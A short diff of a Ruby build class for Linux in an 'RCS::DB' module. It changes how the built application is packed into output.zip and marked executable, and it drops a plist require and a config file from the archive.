@@ -5,8 +5,6 @@
 # from RCS::Common
 require 'rcs-common/trace'
 
-require 'plist'
-
 module RCS
 module DB
 
@@ -71,9 +69,11 @@ class BuildLinux < Build
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
       z.file.open(@appname, "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
-      z.file.chmod(0755, @appname)
+    end
 
-      z.file.open('config', "wb") { |f| f.write File.open(path('config'), 'rb') {|f| f.read} }
+    # make it executable (for some reason we cannot do it in the previous phase)
+    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+      z.file.chmod(0755, @appname)
     end
 
     # this is the only file we need to output after this point
